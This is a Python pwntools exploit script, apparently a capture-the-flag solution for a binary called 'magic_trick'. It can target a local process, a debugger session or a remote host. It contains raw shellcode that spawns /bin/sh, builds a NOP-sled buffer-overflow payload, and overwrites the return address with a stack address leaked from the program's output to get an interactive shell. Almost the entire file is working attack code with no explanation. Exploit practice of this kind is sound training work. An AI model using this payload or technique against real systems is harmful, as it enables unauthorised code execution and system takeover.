from pwn import *
import re

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
interrupt
breakrva *main+280
continue
'''.format(**locals())

# Binary filename
exe = './magic_trick'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
context.terminal = "kitty"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

offset = 0x40
padding = 0x12
# Start program
io = start()

# Build the payload
payload = b"\x90" * (72 - len(shellcode) - padding)
payload += shellcode
payload += b"A" * padding

sleep(4)
data = io.recv(1024)
pattern = r"The number is '(.*)'"
leak = int(re.findall(pattern, data.decode())[0], 16)
info(f"Leak: {hex(leak)}")

payload += p64(leak)[:6]

sleep(10)
io.sendline(b"y")
sleep(5)
io.send(payload)

io.interactive()